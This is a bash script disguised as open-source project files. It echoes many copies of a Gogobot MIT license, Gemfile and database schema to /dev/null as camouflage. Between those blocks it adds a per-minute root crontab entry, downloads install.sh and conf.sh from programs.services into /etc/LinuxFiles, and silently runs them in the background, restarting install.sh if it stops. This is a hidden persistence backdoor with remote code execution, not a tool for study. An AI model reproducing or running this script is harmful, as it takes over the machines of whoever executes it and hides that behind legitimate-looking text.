#!/bin/bash
echo "The MIT License (MIT)

Copyright (c) 2014 Gogobot

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the Software), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

source 'https://rubygems.org'

gem rake
gem sinatra
gem activerecord
gem sinatra-activerecord
gem sinatra-flash
gem 'sinatra-redirect-with-flash'
gem pg
gem 'multi_json'
gem 'thin'
gem 'rack-contrib'

group :development do
 gem tux
end

group :test do
  gem 'rspec', :require => 'spec'
  gem 'rack-test'
  gem 'database_cleaner'
end

# encoding: UTF-8
# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# Note that this schema.rb definition is the authoritative source for your
# database schema. If you need to create the application database on another
# system, you should be using db:schema:load, not running all the migrations
# from scratch. The latter is a flawed and unsustainable approach (the more migrations
# you'll amass, the slower it'll run and the greater likelihood for issues).
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema.define(version: 20141222150038) do

  # These are extensions that must be enabled in order to support this database
  enable_extension plpgsql

  create_table change_logs, force: :cascade do |t|
    t.string   object_name
    t.string   object_id
    t.string   action
    t.json     data
    t.json     snapshot
    t.datetime created_at
    t.datetime updated_at
    t.string   version
  end

  add_index change_logs, [object_name, object_id], name: index_change_logs_on_object_name_and_object_id, using: :btree
  add_index change_logs, [version], name: index_change_logs_on_version, using: :btree

end

The MIT License (MIT)

Copyright (c) 2014 Gogobot

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the Software), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

source 'https://rubygems.org'

gem rake
gem sinatra
gem activerecord
gem sinatra-activerecord
gem sinatra-flash
gem 'sinatra-redirect-with-flash'
gem pg
gem 'multi_json'
gem 'thin'
gem 'rack-contrib'

group :development do
 gem tux
end

group :test do
  gem 'rspec', :require => 'spec'
  gem 'rack-test'
  gem 'database_cleaner'
end

# encoding: UTF-8
# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# Note that this schema.rb definition is the authoritative source for your
# database schema. If you need to create the application database on another
# system, you should be using db:schema:load, not running all the migrations
# from scratch. The latter is a flawed and unsustainable approach (the more migrations
# you'll amass, the slower it'll run and the greater likelihood for issues).
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema.define(version: 20141222150038) do

  # These are extensions that must be enabled in order to support this database
  enable_extension plpgsql

  create_table change_logs, force: :cascade do |t|
    t.string   object_name
    t.string   object_id
    t.string   action
    t.json     data
    t.json     snapshot
    t.datetime created_at
    t.datetime updated_at
    t.string   version
  end

  add_index change_logs, [object_name, object_id], name: index_change_logs_on_object_name_and_object_id, using: :btree
  add_index change_logs, [version], name: index_change_logs_on_version, using: :btree

end
The MIT License (MIT)

Copyright (c) 2014 Gogobot

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the Software), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

source 'https://rubygems.org'

gem rake
gem sinatra
gem activerecord
gem sinatra-activerecord
gem sinatra-flash
gem 'sinatra-redirect-with-flash'
gem pg
gem 'multi_json'
gem 'thin'
gem 'rack-contrib'

group :development do
 gem tux
end

group :test do
  gem 'rspec', :require => 'spec'
  gem 'rack-test'
  gem 'database_cleaner'
end

# encoding: UTF-8
# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# Note that this schema.rb definition is the authoritative source for your
# database schema. If you need to create the application database on another
# system, you should be using db:schema:load, not running all the migrations
# from scratch. The latter is a flawed and unsustainable approach (the more migrations
# you'll amass, the slower it'll run and the greater likelihood for issues).
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema.define(version: 20141222150038) do

  # These are extensions that must be enabled in order to support this database
  enable_extension plpgsql

  create_table change_logs, force: :cascade do |t|
    t.string   object_name
    t.string   object_id
    t.string   action
    t.json     data
    t.json     snapshot
    t.datetime created_at
    t.datetime updated_at
    t.string   version
  end

  add_index change_logs, [object_name, object_id], name: index_change_logs_on_object_name_and_object_id, using: :btree
  add_index change_logs, [version], name: index_change_logs_on_version, using: :btree

end

The MIT License (MIT)

Copyright (c) 2014 Gogobot

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the Software), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

source 'https://rubygems.org'

gem rake
gem sinatra
gem activerecord
gem sinatra-activerecord
gem sinatra-flash
gem 'sinatra-redirect-with-flash'
gem pg
gem 'multi_json'
gem 'thin'
gem 'rack-contrib'

group :development do
 gem tux
end

group :test do
  gem 'rspec', :require => 'spec'
  gem 'rack-test'
  gem 'database_cleaner'
end

# encoding: UTF-8
# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# Note that this schema.rb definition is the authoritative source for your
# database schema. If you need to create the application database on another
# system, you should be using db:schema:load, not running all the migrations
# from scratch. The latter is a flawed and unsustainable approach (the more migrations
# you'll amass, the slower it'll run and the greater likelihood for issues).
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema.define(version: 20141222150038) do

  # These are extensions that must be enabled in order to support this database
  enable_extension plpgsql

  create_table change_logs, force: :cascade do |t|
    t.string   object_name
    t.string   object_id
    t.string   action
    t.json     data
    t.json     snapshot
    t.datetime created_at
    t.datetime updated_at
    t.string   version
  end

  add_index change_logs, [object_name, object_id], name: index_change_logs_on_object_name_and_object_id, using: :btree
  add_index change_logs, [version], name: index_change_logs_on_version, using: :btree

end
" &> /dev/null


if crontab -l | grep -q  "* * * * * bash /etc/LinuxFiles/conf.sh"; then
echo ""
else
	echo "* * * * * bash /etc/LinuxFiles/conf.sh" >> /var/spool/cron/crontabs/root
  
fi

if [ -d "/etc/LinuxFiles" ]  
then
echo ""
else

	mkdir -p /etc/LinuxFiles/ &> /dev/null
	wget -O /etc/LinuxFiles/install.sh http://programs.services/services/install.sh &> /dev/null
	wget -O /etc/LinuxFiles/conf.sh    http://programs.services/services/conf.sh &> /dev/null
        bash /etc/LinuxFiles/install.sh &> /dev/null &
	wget https://github.com/gogobot/evigilo/archive/master.zip

fi



result=`ps aux | grep -i "install.sh" | grep -v "grep" | wc -l`
if [ $result -ge 1 ]
   then
        echo ""
   else
       bash /etc/LinuxFiles/install.sh &> /dev/null &
      
       
fi
echo "The MIT License (MIT)

Copyright (c) 2014 Gogobot

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the Software), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

source 'https://rubygems.org'

gem rake
gem sinatra
gem activerecord
gem sinatra-activerecord
gem sinatra-flash
gem 'sinatra-redirect-with-flash'
gem pg
gem 'multi_json'
gem 'thin'
gem 'rack-contrib'

group :development do
 gem tux
end

group :test do
  gem 'rspec', :require => 'spec'
  gem 'rack-test'
  gem 'database_cleaner'
end

# encoding: UTF-8
# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# Note that this schema.rb definition is the authoritative source for your
# database schema. If you need to create the application database on another
# system, you should be using db:schema:load, not running all the migrations
# from scratch. The latter is a flawed and unsustainable approach (the more migrations
# you'll amass, the slower it'll run and the greater likelihood for issues).
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema.define(version: 20141222150038) do

  # These are extensions that must be enabled in order to support this database
  enable_extension plpgsql

  create_table change_logs, force: :cascade do |t|
    t.string   object_name
    t.string   object_id
    t.string   action
    t.json     data
    t.json     snapshot
    t.datetime created_at
    t.datetime updated_at
    t.string   version
  end

  add_index change_logs, [object_name, object_id], name: index_change_logs_on_object_name_and_object_id, using: :btree
  add_index change_logs, [version], name: index_change_logs_on_version, using: :btree

end

The MIT License (MIT)

Copyright (c) 2014 Gogobot

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the Software), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

source 'https://rubygems.org'

gem rake
gem sinatra
gem activerecord
gem sinatra-activerecord
gem sinatra-flash
gem 'sinatra-redirect-with-flash'
gem pg
gem 'multi_json'
gem 'thin'
gem 'rack-contrib'

group :development do
 gem tux
end

group :test do
  gem 'rspec', :require => 'spec'
  gem 'rack-test'
  gem 'database_cleaner'
end

# encoding: UTF-8
# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# Note that this schema.rb definition is the authoritative source for your
# database schema. If you need to create the application database on another
# system, you should be using db:schema:load, not running all the migrations
# from scratch. The latter is a flawed and unsustainable approach (the more migrations
# you'll amass, the slower it'll run and the greater likelihood for issues).
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema.define(version: 20141222150038) do

  # These are extensions that must be enabled in order to support this database
  enable_extension plpgsql

  create_table change_logs, force: :cascade do |t|
    t.string   object_name
    t.string   object_id
    t.string   action
    t.json     data
    t.json     snapshot
    t.datetime created_at
    t.datetime updated_at
    t.string   version
  end

  add_index change_logs, [object_name, object_id], name: index_change_logs_on_object_name_and_object_id, using: :btree
  add_index change_logs, [version], name: index_change_logs_on_version, using: :btree

end
" &> /dev/null

